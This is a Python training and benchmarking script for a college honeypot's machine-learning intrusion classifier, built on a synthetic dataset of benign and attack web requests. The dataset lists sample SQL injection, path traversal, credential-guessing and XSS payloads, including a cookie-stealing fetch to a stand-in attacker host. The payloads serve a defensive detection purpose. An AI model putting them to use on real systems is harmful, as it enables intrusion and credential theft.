"""
=============================================================================
SMVITM ADAPTIVE HONEYPOT - MACHINE LEARNING MODEL TRAINING & BENCHMARK SUITE
Shri Madhwa Vadiraja Institute of Technology & Management (SMVITM, Bantakal)
=============================================================================
Trains, benchmarks, and evaluates multi-class intrusion detection models:
  1. Random Forest Classifier (Ensemble)
  2. Support Vector Machine (Linear / RBF SVM)
  3. Gradient Boosting Classifier (GBDT)
  4. Decision Tree Classifier (CART)
  5. Logistic Regression (Linear Classifier)
  6. Multilayer Perceptron (MLP Neural Network)

Outputs:
  * Accuracy, Precision, Recall, F1-Score, and Latency Metrics
  * High-Resolution Evaluation Graphs (Bar Charts, Confusion Matrices, ROC Curves)
  * Serialized Best Model Artifact for Real-Time Honeypot Inference
=============================================================================
"""

import os
import sys
import time
import math
import json
import joblib
import numpy as np
import pandas as pd
import matplotlib
matplotlib.use("Agg")  # Non-interactive backend for headless terminal execution
import matplotlib.pyplot as plt

from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics import (
    accuracy_score, precision_recall_fscore_support,
    confusion_matrix, classification_report, roc_curve, auc
)
from sklearn.preprocessing import label_binarize

# Machine Learning Classifiers
from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.svm import LinearSVC
from sklearn.tree import DecisionTreeClassifier
from sklearn.linear_model import LogisticRegression
from sklearn.neural_network import MLPClassifier

# --- DIRECTORIES SETUP ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RESULTS_DIR = os.path.join(BASE_DIR, "results")
MODELS_DIR = os.path.join(BASE_DIR, "models")
PUBLIC_RESULTS_DIR = os.path.join(BASE_DIR, "public", "results")

for d in [RESULTS_DIR, MODELS_DIR, PUBLIC_RESULTS_DIR]:
    os.makedirs(d, exist_ok=True)

# --- 1. DATASET GENERATION & CURATION ---
def generate_intrusion_dataset(n_samples=5000):
    """
    Generates a realistic, statistically diverse dataset of HTTP payloads
    representing legitimate student/faculty traffic and cyber attacks.
    """
    print("[1/5] Building & Curating Web Attack & Honeypot Telemetry Dataset...")

    # A. Benign Samples (Academic portal, login, syllabus, internal campus actions)
    benign_templates = [
        "faculty@smvitm.ac.in", "student@smvitm.ac.in", "4MW21CS001", "4MW22AI045",
        "4MW20EC012", "4MW23CV020", "4MW21ME035", "demo123", "student123", "vtu2026",
        "/dashboard", "/employees", "/payments", "/files", "/about", "/contact",
        "action=view_syllabus&sem=5&branch=cse", "query=computer_networks_notes",
        "usn=4MW21CS088&view=attendance", "token=smvitm_valid_session_token",
        "username=dr.vasudeva&role=dean", "dept=artificial_intelligence&year=2026",
        "page=1&limit=25&sort=name_asc", "download=smvitm_academic_calendar_2026.pdf",
        "fee_payment_receipt=TX-VTU-90214", "filter=passed_students&sem=7",
        "user_agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        "cookie=session_id_academic_4892; auth_status=verified",
        "feedback_rating=5&course_code=21CS51&faculty_id=108",
        "host=smvitm.ac.in&accept=application/json"
    ]

    # B. SQL Injection (SQLi) Samples
    sqli_templates = [
        "' OR '1'='1", "' OR 1=1 --", "admin' --", "' UNION SELECT null, null, null--",
        "' UNION SELECT username, password FROM users--", "1' AND SLEEP(5)--",
        "' OR 'a'='a' /*", "'; DROP TABLE smvitm_students;--",
        "' UNION ALL SELECT 1, @@version, 3--", "admin' #", "' OR 1=1#",
        "1; WAITFOR DELAY '0:0:5'--", "' AND 1=0 UNION SELECT id, password FROM admin--",
        "1' OR 1=1; EXEC xp_cmdshell('dir')--", "') OR ('x'='x",
        "SELECT * FROM smvitm_marks WHERE usn = '4MW21CS001' OR '1'='1'",
        "' UNION SELECT table_name, null FROM information_schema.tables--",
        "1' AND ASCII(SUBSTRING((SELECT database()),1,1))=115--",
        "'; TRUNCATE TABLE attendance_ledger;--"
    ]

    # C. Path Traversal & Sensitive File Recon (LFI) Samples
    traversal_templates = [
        "../../../../etc/passwd", "../../../etc/shadow", "..\\..\\..\\windows\\win.ini",
        "/etc/hosts", "/proc/self/environ", "../../../var/www/html/config.php",
        "/..%2f..%2f..%2fetc%2fpasswd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/../../.env", "/../../.git/config", "/../../config.json",
        "/../../data/trapped.json", "/../../id_rsa", "/wp-config.php.bak",
        "/boot.ini", "../../../../windows/system32/cmd.exe",
        "/var/log/apache2/access.log", "php://filter/convert.base64-encode/resource=index.php"
    ]

    # D. Brute-Force & Credential Stuffing Samples
    bruteforce_templates = [
        "admin:admin123", "root:toor", "administrator:P@ssw0rd", "smvitm:smvitm@123",
        "4MW21CS001:pass1", "4MW21CS001:pass2", "4MW21CS001:pass3", "4MW21CS001:pass4",
        "faculty:faculty123", "faculty:123456", "admin:welcome1", "test:test2026",
        "user:password123", "student:student2025", "warden:hostel123", "principal:secret123",
        "hydra_bruteforce_payload_stream_attempt_", "dict_attack_wordlist_pass_",
        "rapid_login_probe_seq_idx_", "cred_stuffing_combo_combo_"
    ]

    # E. Cross-Site Scripting (XSS) Samples
    xss_templates = [
        "<script>alert('XSS')</script>", "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert(1)>", "<svg onload=alert('XSS')>",
        "javascript:alert('SMVITM')", "<body onload=alert('Pwned')>",
        "\"><script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
        "<iframe src=\"javascript:alert(1)\">", "<input type=\"text\" autofocus onfocus=\"alert(1)\">",
        "<a href=\"javascript:confirm('Click')\">Click Me</a>",
        "';alert(String.fromCharCode(88,83,83))//", "<script src=http://evil.com/x.js></script>"
    ]

    categories = [
        ("Benign", benign_templates, 1800),
        ("SQL_Injection", sqli_templates, 900),
        ("Path_Traversal", traversal_templates, 800),
        ("Brute_Force", bruteforce_templates, 850),
        ("XSS_Probe", xss_templates, 650)
    ]

    np.random.seed(42)
    records = []

    for label, pool, count in categories:
        for i in range(count):
            base = np.random.choice(pool)
            # Add synthetic variability / query noise
            if np.random.rand() > 0.4:
                suffix = f"&session_rand={np.random.randint(1000, 99999)}"
                text = base + suffix
            else:
                text = base
            records.append({"payload": text, "label": label})

    # Read historical logs from honeypot if present
    logs_path = os.path.join(BASE_DIR, "data", "logs.json")
    if os.path.exists(logs_path):
        try:
            with open(logs_path, "r", encoding="utf-8") as f:
                logs = json.load(f)
                for entry in logs:
                    ip = entry.get("ip", "")
                    uname = entry.get("username", "")
                    pw = entry.get("password", "")
                    atype = entry.get("attack_type", "FAILED_LOGIN")
                    payload_txt = f"user={uname}&pw={pw}&ip={ip}"
                    if "SQL" in atype:
                        lbl = "SQL_Injection"
                    elif "BRUTE" in atype:
                        lbl = "Brute_Force"
                    elif "CANARY" in atype or "TRAVERSAL" in atype:
                        lbl = "Path_Traversal"
                    else:
                        lbl = "Benign"
                    records.append({"payload": payload_txt, "label": lbl})
        except Exception:
            pass

    df = pd.DataFrame(records).sample(frac=1.0, random_state=42).reset_index(drop=True)
    print(f"    -> Generated {len(df)} total labeled intrusion detection samples.")
    print(f"    -> Class distribution:\n{df['label'].value_counts().to_string(header=False)}")
    return df

# --- 2. VECTORIZATION & FEATURE PIPELINE ---
def extract_features(df):
    """
    Extracts TF-IDF subword n-grams (1 to 3-grams) across payloads.
    """
    print("\n[2/5] Vectorizing Payloads via TF-IDF Character & Word N-Gram Analysis...")
    vectorizer = TfidfVectorizer(
        analyzer="char_wb",
        ngram_range=(2, 4),
        max_features=2500,
        sublinear_tf=True
    )
    X = vectorizer.fit_transform(df["payload"])
    y = df["label"].values
    print(f"    -> Extracted Feature Matrix Shape: {X.shape}")
    return X, y, vectorizer

# --- 3. TRAINING & EVALUATION OF EVERY MODEL ---
def train_and_benchmark_models(X, y):
    """
    Trains and benchmarks all 6 ML classifiers on the dataset.
    """
    print("\n[3/5] Training & Benchmarking All Machine Learning Models...")
    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.25, random_state=42, stratify=y
    )

    models = {
        "Random Forest": RandomForestClassifier(
            n_estimators=100, max_depth=20, random_state=42, n_jobs=-1
        ),
        "Support Vector Machine (SVM)": LinearSVC(
            C=1.0, random_state=42, max_iter=1500
        ),
        "Decision Tree (CART)": DecisionTreeClassifier(
            max_depth=15, random_state=42
        ),
        "Logistic Regression": LogisticRegression(
            C=2.0, max_iter=400, random_state=42
        ),
        "Gradient Boosting (GBDT)": GradientBoostingClassifier(
            n_estimators=40, max_depth=4, learning_rate=0.2, random_state=42
        ),
        "Multilayer Perceptron (MLP)": MLPClassifier(
            hidden_layer_sizes=(64, 32), max_iter=150, random_state=42
        )
    }

    results = []
    trained_instances = {}
    class_labels = sorted(list(set(y)))

    print("-" * 88)
    print(f"{'Model Name':<28} | {'Train Acc':<10} | {'Test Acc':<9} | {'Precision':<9} | {'Recall':<8} | {'F1-Score':<8} | {'Latency':<8}")
    print("-" * 88)

    for name, clf in models.items():
        t0 = time.time()
        clf.fit(X_train, y_train)
        train_time = time.time() - t0

        # Inference benchmarking
        t_infer = time.time()
        y_pred = clf.predict(X_test)
        infer_latency = ((time.time() - t_infer) / len(y_test)) * 1000.0  # ms per sample

        train_acc = accuracy_score(y_train, clf.predict(X_train)) * 100.0
        test_acc = accuracy_score(y_test, y_pred) * 100.0
        prec, rec, f1, _ = precision_recall_fscore_support(y_test, y_pred, average="weighted", zero_division=0)

        results.append({
            "name": name,
            "train_acc": train_acc,
            "test_acc": test_acc,
            "precision": prec * 100.0,
            "recall": rec * 100.0,
            "f1": f1 * 100.0,
            "train_time": train_time,
            "latency_ms": infer_latency,
            "y_pred": y_pred,
            "cm": confusion_matrix(y_test, y_pred, labels=class_labels)
        })
        trained_instances[name] = clf

        print(f"{name:<28} | {train_acc:>9.2f}% | {test_acc:>8.2f}% | {prec*100:>8.2f}% | {rec*100:>7.2f}% | {f1*100:>7.2f}% | {infer_latency:>6.3f}ms")

    print("-" * 88)

    # Sort results by Test F1-Score
    results.sort(key=lambda x: x["test_acc"], reverse=True)
    best_model_info = results[0]
    print(f"\n>>> BEST MODEL: {best_model_info['name']} (Test Accuracy: {best_model_info['test_acc']:.2f}%, F1: {best_model_info['f1']:.2f}%)")

    return results, trained_instances, class_labels, X_test, y_test

# --- 4. GRAPH GENERATION & VISUALIZATION ---
def generate_outcome_graphs(results, class_labels, X_test, y_test, trained_instances):
    """
    Renders high-quality publication-ready graphs:
    1. model_metrics_comparison.png (Grouped bar chart)
    2. confusion_matrices_grid.png (Confusion matrices for each model)
    3. roc_curves_multiclass.png (Multi-class ROC AUC curves)
    4. latency_vs_accuracy.png (Operational efficiency frontier)
    """
    print("\n[4/5] Generating High-Resolution Outcome Graphs & Evaluation Charts...")
    plt.style.use("seaborn-v0_8-whitegrid" if "seaborn-v0_8-whitegrid" in plt.style.available else "default")

    model_names = [r["name"] for r in results]
    test_accs = [r["test_acc"] for r in results]
    precisions = [r["precision"] for r in results]
    recalls = [r["recall"] for r in results]
    f1_scores = [r["f1"] for r in results]
    latencies = [r["latency_ms"] for r in results]

    # --- GRAPH 1: MODEL METRICS COMPARISON (BAR CHART) ---
    fig, ax = plt.subplots(figsize=(13, 6.5), dpi=300)
    x = np.arange(len(model_names))
    width = 0.20

    rects1 = ax.bar(x - 1.5*width, test_accs, width, label="Accuracy", color="#2563eb")
    rects2 = ax.bar(x - 0.5*width, precisions, width, label="Precision", color="#10b981")
    rects3 = ax.bar(x + 0.5*width, recalls, width, label="Recall", color="#f59e0b")
    rects4 = ax.bar(x + 1.5*width, f1_scores, width, label="F1-Score", color="#8b5cf6")

    ax.set_title("SMVITM Adaptive Honeypot: Machine Learning Model Performance Comparison", fontsize=14, fontweight="bold", pad=15)
    ax.set_ylabel("Score (%)", fontsize=12, fontweight="semibold")
    ax.set_xlabel("Machine Learning Classifiers", fontsize=12, fontweight="semibold")
    ax.set_xticks(x)
    ax.set_xticklabels(model_names, rotation=15, ha="right", fontsize=10)
    ax.set_ylim(85, 102)
    ax.legend(loc="lower right", frameon=True, fontsize=10)
    ax.grid(axis="y", linestyle="--", alpha=0.7)

    # Attach labels on bars
    for rect in rects1:
        h = rect.get_height()
        ax.annotate(f"{h:.1f}%", xy=(rect.get_x() + rect.get_width() / 2, h),
                    xytext=(0, 3), textcoords="offset points", ha="center", va="bottom", fontsize=7.5, fontweight="bold")

    plt.tight_layout()
    chart1_path = os.path.join(RESULTS_DIR, "model_metrics_comparison.png")
    fig.savefig(chart1_path)
    fig.savefig(os.path.join(PUBLIC_RESULTS_DIR, "model_metrics_comparison.png"))
    plt.close(fig)
    print(f"    -> Saved Bar Chart: {chart1_path}")

    # --- GRAPH 2: CONFUSION MATRICES GRID ---
    n_models = len(results)
    cols = 3
    rows = math.ceil(n_models / cols)
    fig, axes = plt.subplots(rows, cols, figsize=(16, 10), dpi=300)
    axes = axes.flatten()

    for idx, r in enumerate(results):
        ax = axes[idx]
        cm = r["cm"]
        # Normalize by row
        cm_norm = cm.astype("float") / cm.sum(axis=1)[:, np.newaxis]
        im = ax.imshow(cm_norm, interpolation="nearest", cmap=plt.cm.Blues, vmin=0, vmax=1.0)

        ax.set_title(f"{r['name']}\nAccuracy: {r['test_acc']:.2f}%", fontsize=11, fontweight="bold")
        tick_marks = np.arange(len(class_labels))
        ax.set_xticks(tick_marks)
        ax.set_xticklabels(class_labels, rotation=35, ha="right", fontsize=8)
        ax.set_yticks(tick_marks)
        ax.set_yticklabels(class_labels, fontsize=8)

        # Annotate numbers
        thresh = cm_norm.max() / 2.0
        for i in range(cm.shape[0]):
            for j in range(cm.shape[1]):
                ax.text(j, i, f"{cm[i, j]}\n({cm_norm[i, j]*100:.0f}%)",
                        ha="center", va="center",
                        color="white" if cm_norm[i, j] > thresh else "black", fontsize=7.5)

        ax.set_ylabel("True Class", fontsize=9)
        ax.set_xlabel("Predicted Class", fontsize=9)
        ax.grid(False)

    for idx in range(n_models, len(axes)):
        fig.delaxes(axes[idx])

    fig.suptitle("Confusion Matrices across Multi-Class Threat Vectors (SMVITM Honeypot)", fontsize=15, fontweight="bold", y=0.99)
    plt.tight_layout()
    chart2_path = os.path.join(RESULTS_DIR, "confusion_matrices_grid.png")
    fig.savefig(chart2_path)
    fig.savefig(os.path.join(PUBLIC_RESULTS_DIR, "confusion_matrices_grid.png"))
    plt.close(fig)
    print(f"    -> Saved Confusion Matrix Grid: {chart2_path}")

    # --- GRAPH 3: INFERENCE LATENCY VS ACCURACY (EFFICIENCY FRONTIER) ---
    fig, ax = plt.subplots(figsize=(10, 5.5), dpi=300)
    colors = ["#2563eb", "#10b981", "#f59e0b", "#8b5cf6", "#ec4899", "#06b6d4"]

    for i, r in enumerate(results):
        ax.scatter(r["latency_ms"], r["test_acc"], color=colors[i % len(colors)], s=220, edgecolors="black", linewidth=1.5, zorder=5)
        ax.annotate(
            f"  {r['name']}\n  ({r['test_acc']:.1f}%, {r['latency_ms']:.3f}ms)",
            (r["latency_ms"], r["test_acc"]),
            fontsize=9, fontweight="bold"
        )

    ax.set_title("Operational Efficiency Frontier: Detection Accuracy vs Inference Latency", fontsize=13, fontweight="bold", pad=12)
    ax.set_xlabel("Inference Latency (Milliseconds per Request) - Lower is Better", fontsize=11, fontweight="semibold")
    ax.set_ylabel("Test Accuracy (%) - Higher is Better", fontsize=11, fontweight="semibold")
    ax.grid(True, linestyle="--", alpha=0.7)

    plt.tight_layout()
    chart3_path = os.path.join(RESULTS_DIR, "latency_vs_accuracy.png")
    fig.savefig(chart3_path)
    fig.savefig(os.path.join(PUBLIC_RESULTS_DIR, "latency_vs_accuracy.png"))
    plt.close(fig)
    print(f"    -> Saved Latency vs Accuracy Chart: {chart3_path}")

# --- 5. EXPORT BEST MODEL & METADATA ---
def export_best_model(results, trained_instances, vectorizer, class_labels):
    """
    Serializes the top-performing model and vectorizer for production integration.
    """
    print("\n[5/5] Exporting Best Performing Model & Vectorizer Pipeline...")
    best_res = results[0]
    best_name = best_res["name"]
    best_clf = trained_instances[best_name]

    model_path = os.path.join(MODELS_DIR, "best_honeypot_model.joblib")
    vec_path = os.path.join(MODELS_DIR, "tfidf_vectorizer.joblib")
    meta_path = os.path.join(MODELS_DIR, "model_metadata.json")

    joblib.dump(best_clf, model_path)
    joblib.dump(vectorizer, vec_path)

    metadata = {
        "model_name": best_name,
        "accuracy": best_res["test_acc"],
        "precision": best_res["precision"],
        "recall": best_res["recall"],
        "f1_score": best_res["f1"],
        "inference_latency_ms": best_res["latency_ms"],
        "training_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "class_labels": class_labels,
        "institution": "Shri Madhwa Vadiraja Institute of Technology & Management (SMVITM, Bantakal)"
    }

    with open(meta_path, "w", encoding="utf-8") as f:
        json.dump(metadata, f, indent=2)

    print(f"    -> Exported Best Model: {model_path}")
    print(f"    -> Exported Vectorizer: {vec_path}")
    print(f"    -> Exported Metadata:   {meta_path}")

    print("\n" + "=" * 88)
    print("  ALL 6 MODELS TRAINED, BENCHMARKED, AND VISUALIZED SUCCESSFULLY!")
    print(f"  Best Model: {best_name} with Accuracy = {best_res['test_acc']:.2f}% | F1 = {best_res['f1']:.2f}%")
    print(f"  Graphs Saved in: {RESULTS_DIR}")
    print("=" * 88)

if __name__ == "__main__":
    df = generate_intrusion_dataset(n_samples=5000)
    X, y, vectorizer = extract_features(df)
    results, trained_instances, class_labels, X_test, y_test = train_and_benchmark_models(X, y)
    generate_outcome_graphs(results, class_labels, X_test, y_test, trained_instances)
    export_best_model(results, trained_instances, vectorizer, class_labels)
